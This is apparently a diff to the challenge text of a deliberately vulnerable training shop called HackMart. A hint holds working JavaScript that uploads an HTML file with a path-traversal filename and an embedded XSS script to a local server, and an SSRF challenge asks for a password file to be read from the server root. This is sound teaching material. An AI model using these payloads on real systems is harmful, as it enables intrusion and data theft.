@@ -80,7 +80,7 @@
       "hint5": "```js\nconst token = localStorage.getItem(\"token\");\n\nconst formData = new FormData();\nformData.append(\"name\", \"test\");\nformData.append(\"price\", \"13.99\");\nformData.append(\"stock\", \"5\");\n\nconst fileContent = \"<h1>Hack!</h1><script>alert('XSS')</script>\";\nconst file = new File([fileContent], \"../src/main/resources/static/hacked.html\", { type: \"text/html\" });\nformData.append(\"image\", file);\n\nfetch(\"http://localhost:7000/api/products\", {\n  method: \"POST\",\n  headers: {\n    Authorization: token\n  },\n  body: formData\n});\n```"
     },
     "ssrf": {
-      "title": "SSRF – Hidden Password Mission",
+      "title": "Server-Side Request Forgery",
       "description": "The application's backend allows downloading external files via the `url` parameter in the `/api/fetch` endpoint. However, this address is not validated, which makes the application vulnerable to Server-Side Request Forgery (SSRF). This vulnerability can be used to read files located on the server itself.",
       "task": "Your goal is to read the contents of the `password.txt` file located in the root directory of the server. This file contains a secret needed to complete the challenge.",
       "hint0": "Visit HackMart's homepage and observe how partner logos are loaded. Pay attention to the URL used to fetch them.",
